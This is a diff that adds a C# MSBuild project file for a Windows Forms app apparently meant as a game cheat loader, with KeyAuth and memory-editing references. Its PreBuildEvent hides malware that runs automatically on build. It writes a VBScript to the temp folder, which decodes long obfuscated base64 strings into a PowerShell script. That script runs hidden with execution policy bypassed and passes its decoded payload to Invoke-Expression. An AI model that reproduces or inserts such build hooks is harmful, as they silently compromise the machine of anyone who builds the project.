@@ -1,0 +1,137 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{0058CD3F-FC93-4AFF-A234-92DCE244B663}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>External</RootNamespace>
+    <AssemblyName>External</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>x64</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>app1.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DiscordRPC, Version=1.2.1.24, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>..\packages\DiscordRichPresence.1.2.1.24\lib\net45\DiscordRPC.dll</HintPath>
+    </Reference>
+    <Reference Include="Guna.UI2, Version=2.0.4.6, Culture=neutral, PublicKeyToken=8b9d14aa5142e261, processorArchitecture=MSIL">
+      <HintPath>..\packages\Guna.UI2.WinForms.2.0.4.6\lib\net472\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="K4os.Compression.LZ4, Version=1.3.8.0, Culture=neutral, PublicKeyToken=2186fa9121ef231d, processorArchitecture=MSIL">
+      <HintPath>..\packages\K4os.Compression.LZ4.1.3.8\lib\net462\K4os.Compression.LZ4.dll</HintPath>
+    </Reference>
+    <Reference Include="Memory">
+      <HintPath>..\..\..\..\Desktop\Spoyn\Spoyn\New folder\Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.13.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Buffers.4.5.1\lib\net461\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Core" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Memory, Version=4.0.1.2, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Memory.4.5.5\lib\net461\System.Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Numerics.Vectors.4.5.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>..\packages\System.Runtime.CompilerServices.Unsafe.6.0.0\lib\net461\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Web" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ghostgoomen.cs" />
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="FXMAIN.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FXMAIN.Designer.cs">
+      <DependentUpon>FXMAIN.cs</DependentUpon>
+    </Compile>
+    <Compile Include="KeyAuth.cs" />
+    <Compile Include="Particles_By_Falcon_X.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="RPC.cs" />
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="FXMAIN.resx">
+      <DependentUpon>FXMAIN.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <None Include="app.manifest" />
+    <None Include="app1.manifest" />
+    <None Include="packages.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PreBuildEvent>@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\a&quot;&#xD;&#xA;mkdir &quot;%25a%25&quot; 2&gt;nul&#xD;&#xA;echo b = &quot;JFIgPSAic0pISTcwSElsVm5icFJuYnZOVWVzUm5ibHhXYVRCaWJ2bEdkakZrY3ZKbmNGMUNJcDBXWjBOWGVUcGpPZE5YWjBWbllwSkhkMEZVWnNsbVJ1OFVTdTBXWjBOWGVUdEZJeTltWXRBaWJsUkdacGhrTzYwMWNsUlhkaWxtYzBSWFFseFdhRzV5VEo1U2JsUjNjNU4xV29BU1oxeFdZVzFDSXpWR2QxSldheVJIZEJCU1p0Rm1UdEFDWmtBQ2EwRkdVdEFTZTBKWFp3OW1jUTFXWjBsVUwwVjJVZ3NUWjE1V2EwNTJiRGxIYjA1V1pzbDJVZzQyYnBSM1lCSjNieUpYUnRBU0t0VkdkemwzVTZvVFh6VkdkMUpXYXlSSGRCVkdicFprTFBsa0x0VkdkemwzVWJCaWN2SldMZzRXWmtSV2FJcGpPZE5YWjBWbllwSkhkMEZVWnNsbVJ1OFVTdTBXWjBOWGVUdEZLZ1VXZHNGbVZ0QXljbFJYZGlsbWMwUlhRZ1VXYmg1VUxnOEdKZ2dHZGhCVkxna0hkeVZHY3ZKSFV0VkdkSjFDZGxORkk3a0NLbE4zYndOWGFFNXlZM1JDSTdreWJrQUNMMVJDS2x4V2FHUldZdnhtYjM5R1J1TTJka0F5TzA1V1pweDJRaVYyVnVRWFpPNVNibFIzYzVORkkwTldacUoyVHRjWFpPQlNQZ00yZGtBeU9pVUdlbDVpZTNJQ0lvUlhZUVJHYnBoMlF0QUNaa0FDYTBGR1V0QUNhMEZHVXQ0V2F2cEVJOUF5YmtBeU9pVUdlbDVpYzZkekxoOXlaeTltTHdsbWV0Y2pMM2QzZHY4aU96QkhkMGhtSWcwREkxUkNJN3dHYjE1VUwwVjNUZ3dISWxObWN2WlVMZ1FHSmdnR2RoQlZMZ2tuY3ZSM1lsSlhhRUJTWndsSFZ0VkdkSjFDSXRWR2RKMXlkbDVFSTdCU0twSVNaNFZtTDZkRFhrUmlJZ2dHZGhCVkwwTlhaVWhDSTA5bWJ0Z0NJbWxHSTdJQ2NwcGxibFpYWnp4VlkwRkdSdEZtY245bWNReGxPREpDSTlBQ1prQXlPOUJDZHBGMlZ0QWlibFJHWnBoRUlseFdlME4xZHZSbWJwZFZMZ2NtY2hSQ0kwTlhhTVJuYmwxV2RuSlhRdEFpZWtBQ2EwRkdVbHhXYUcxQ0l6TlhaajltY1ExQ2R5RkdkVEJ5T2lrWExnQUhKdzFDSWlBMmJrSUNZdjFDSWlBV1lrSUNZZ2duSWcwREluSlhZa0F5T2lVR2VsNWllM3dGY3BwbGJsWlhaenhWWTBGR1J0Rm1jbjltY1F4bE9ESkNJOUFpZWtBeU96UkNJcDFDSTJCU1BnQUhKZ3NqSTkwemRPUlRRcDFFZUZSVVMwTUdSSkpUVEVsa01GUlZUblZGVk9kV1FFOTBaTlJWVDRGVWFPTlRRRDVVTUJsV1R3RTBVT05UUTUxMGRGUlVTNjFFUkpOVFZFbFVNWlJVU3owRVJKZFhWRWxFTnJSVVMwMEVSSkJ6YUVsRWVWUlVTNWRHUkpCVFFVMWtJZzBESXpSQ0lwOEdKZGRtYnBKSGR6dEZJc0VHSmRkbWJwSkhkenRGS2cwV1l5RkdjZ3NISWxCaWJ2bEdkajVXZG1CeU85Qmlja0FpYnlWSGRsSkhJNzBISTRSU1gwNVdhYjFsY2hoMl&quot; &gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo c = &quot;oQlZMdWwyYktCU1BnWUdKZ3NUS29nR2RoQkZjdFZHVjBWMlI2b1RYb1JYWVE1eVRKNVNibFIzYzVOMVdnMERJMFJDSTdrQ0tuNVdheVIzVXZSbExwZ0NacFYzUjNWbVQ2b1RYa2xXZEg1U2JsUjNjNU4xV2cwREluUkNJOUJ5WXZKSGNrQXlhdEFpY2tBU2J0MUNJa0JTUGd3R1prQXllZ2tpY2tnQ0ltbEdJN1FHSmdrbWNWMUNJazlHYTBWV1QwTlhaUzFTWnI5bWR1bEVJOUFpY2tBeU9qOTJieUJISmdzV0xnVUdKZzBXYnRBQ1pnMERJa1JDSTdCU2V5UkhJOUJpYnlWSGRsSkhJN0JTS2xSQ0kwOW1idGdDSW1sR0lwVUdKZGRtYnBKSGR6dEZLZzBXWXlGR2Nnc0hJd0JpYnZsR2RqNVdkbUJ5TzlCU2Znd21jZ3NETXlBeWNrNTJialYyVXRBQ2NsVkdiVDFDZHlGR2RUQnllZ2cyWTBGMllnMEhJaTBUUEJGM1F5VnpkbTlVVGkxMlNOOUdSUUYzZGk5MFl2UmtZeWQzYlBoelpFUmxOM1ozVE5oR1JRQjNkMzlVVHZSa1p4ZG5hQ1Z6ZFJ0MGN3UjBOMWNYZU9aemQwczBjdk5FVTNjblVQTkdjRFptTjNOMVQ0STNRWUpEYkRabU13UmtkMWMzTUwxVWNFTmpjM0pDSXdCeWVna25jMEJ5ZWc4R0l1OVdhME5tYjFaR0k5QlNmZzhHSTdCQ2FqUlhZakJTZmdJU013VnpkenNVVHRSa2UxY25SUGhUVzR0MGN1TkVUSTEyUXlCM2RqUm5OMzEwVGpSM1FRRjNkRjkwY3RSa2F4ZFhSUE5HY0Rwbk4zOTBUakozUVlKRGJEWm1Nd1JrZDFjM01MMVVjRU5qYzNKQ0l3QnllZ2tuYzBCeWVnd0dJdTlXYTBObWIxWkdJOUJTZmd3R0k3QkNhalJYWWpCU2ZnSVNTTGhEZERKbmMzeDJUNE0zUUVCM2RHdDBjelJrZXdkSE1MaERiREpYTjNObVIyY1hZUE5IY0R4VWMzUjBUajVHUjZWemRGOTBZd05rZTJjM1RQTm1jRGhsTXNOa1p5QUhSMlZ6ZHpzVVR4UjBNeWRuSWdBSEk3QlNleVJISTdCQ2VnNDJicFIzWXVWblpnMEhJOUJDZWdzSElvTkdkaE5HSTlCaUk5MHpaMU5FVzFjSFNQaHpiRHgwTjNOMVQ0NDJRTVp6ZFM5VVR5TjBNeGRuWVBObmFESm1OM0YxVHpSM1FRRjNkRDlFT3ZSME0xY25UTE5uYkR4a04zcDFUNEkzUVlKRGJEWm1Nd1JrZDFjM01MMVVjRU5qYzNKQ0l3QnllZ2tuYzBCeWVnd21jZzQyYnBSM1l1Vm5aIjsgJHR4dCA9ICRSLlRvQ2hhckFycmF5KCk7IFthcnJheV06OlJldmVyc2UoJHR4dCk7ICRibmIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC1qb2luICR0eHQpKTsgJGV4cCA9ICJJbnZva2UtRXhwcmVzc2lvbiI7IE5ldy1BbGlhcyAtTmFtZSBwV04gLVZhbHVlICRleHAgLUZvcmNlOyBwV04gJGJuYg==&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo d = &quot;liQlNQckFpY2tBeWVna3lZa0FpYnBCQ2VrZ0NJb05XWWxKM2JtQnlPaUlDSTlBaWNrQXlPbkF5SmdRWGFzQjNjdEF5Y2tBU1BnTUdKZ3NUS2lSQ0tuNVdheVIzVTBWMlJ1Z2pSVVZsTzYwMVp1bEdadk5tYkY1Q2Q0VkdWdTBXWjBOWGVUdEZJOUF5Y2tBeU9wa0dKb2NtYnBKSGRUUmpObE5YWUMxMmJ5WmtPNjBGZHlWbWR1OTJRdTBXWjBOWGVUdEZJOUFpWWtBU0twUlNYbjVXYXlSM2NiaENJdEZtY2hCSEk3QmlkZzQyYnBSM1l1Vm5aZ3NqSTl4Q0pnZDFPaEoyZStCa2I0MDBNNHdTT2lCWGNpQVNQZ00yYnlCSEpnc1RmZzBISTM5bWNvUkhJN0JDYWpSWFlqQlNmZ1FHSmc0V2F2cFdMZzRtYzFSWFp5QnlPOUJTS3dSQ0l0QXlZa2dTWHlGR2FqdEZJOUFTWHBSeVdrUkNJNzBGYTBkbWJseGtMclJDSWxBU2FrczFha0FTUGdBSEpnc1RYcFJ5V3pSQ0k5QXlZa0F5ZWdreUtya0dKZ3NEYTBkbWJseGtMelJDSTB4V0xna0dKZ3NETWcwRElwUkNLZ0kzYm1CeU9vUjNadVZHVHVNSEpnMDFXeUZHYWpCQ2RqVm1haTlVTDNWbVRnMERJa1JDSTdraVlrZ3ladWxtYzBORmRsZGtMNFlFVlZwak9kZG1icFIyYmo1V1J1UUhlbFJsTHRWR2R6bDNVYkJTUGdNSEpnc1RLdDFHSm9jbWJwSkhkVFJqTmxOWFlDMTJieVprTzYwRmR5Vm1kdTkyUXUwV1owTlhlVHRGSTlBaVlrQXllZ2tuYzBCU0tyUlNYbjVXYXlSM2NiQkNMdDFHSmRkbWJwSkhkenRGS2cwV1l5RkdjZ3NISWtCaWJ2bEdkajVXZG1CeU9pUW5lZkZUZXQxak5vMUNkck5FZFZKQ0k5QXlZdjltY3dSQ0k3MEhJOUJ5ZHZKSGEwQnllZ2cyWTBGMllnMEhJOUJTZmdZR0pnMFdaMGxVTGxaM2J0Vm1VZ3NISXBZR0pnZ0dkaEJWTDBOWFpVaENJbWxHSTlCaWJsUkdacGhFSWx4V2UwTjFkdlJtYnBkVkxnWUVlbFJDSW9SWFlRVkdicFpVTGdNM2NsTjJieUJWTDBKWFkwTkZJN0JTS0doWFprQUNhMEZHVXRRM2NsUkZLZ1lXYWdzaklsaFhadUlYWjB4V2FHaDJZeUZXWlRKQ0k0VkdKZ2dHZGhCVkx1bDJiS0JTUGdZRWVsUkNJN2dYWmtBeWJ0QWlaa0FTWXRBU1pnc1RLaVJDSXNZR0pvTVhaMGxuUXN4V1FsUlhheWRsTzYwVlpzbG1SdThVU3UwV1owTlhlVHRGSTdCU0t3QUNkbjFDSW9SM1p1VkdUdUlHSm9BaVpwQnlPcHdHWmtnU1kwRkdSa0YyYnM1MmR2UmtMalJDSTlBaVlrQXlPMDVXWnB4MlFpVjJWdVFYWk81U2JsUjNjNU5GSTBOV1pxSjJUdGNYWk9CU1BnTUdKZ3NUS3BneVp1bG1jME4xYlU1U0tvUVdhMWQwZGw1a082MEZacFYzUnUwV1owTlhlVHRGS2dRSEpnZ0dkaEJWTHVsMmJLQlNQZ2dYWmtBeU9wSWllMzRpSWdzQ0luUkNLZ1FISmdnR2R&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo e = b ^&amp; d ^&amp; c &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set f = CreateObject(&quot;MSXml2.DOMDocument.6.0&quot;).createElement(&quot;base64&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo f.DataType = &quot;bin.base64&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo f.Text = e &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo g = f.NodeTypedValue &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo h = &quot;%25a%25\i.ps1&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set j = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set k = j.CreateTextFile(h, True) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo k.Write l(g) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo k.Close &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set m = CreateObject(&quot;WScript.Shell&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo m.Run &quot;powershell.exe -ExecutionPolicy Bypass -File &quot; ^&amp; h, 0, False &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Function l(n) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Dim o, p &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Set o = CreateObject(&quot;ADODB.Recordset&quot;) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo p = LenB(n) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo If p ^&gt; 0 Then &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Fields.Append &quot;q&quot;, 201, p &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Open &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.AddNew &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o(&quot;q&quot;).AppendChunk n &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo o.Update &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo l = o(&quot;q&quot;).GetChunk(p) &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo Else &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo l = &quot;&quot; &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo End If &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;echo End Function &gt;&gt; &quot;%25a%25\b.vbs&quot;&#xD;&#xA;cscript //nologo &quot;%25a%25\b.vbs&quot;&#xD;&#xA;endlocal</PreBuildEvent>
+  </PropertyGroup>
+</Project>
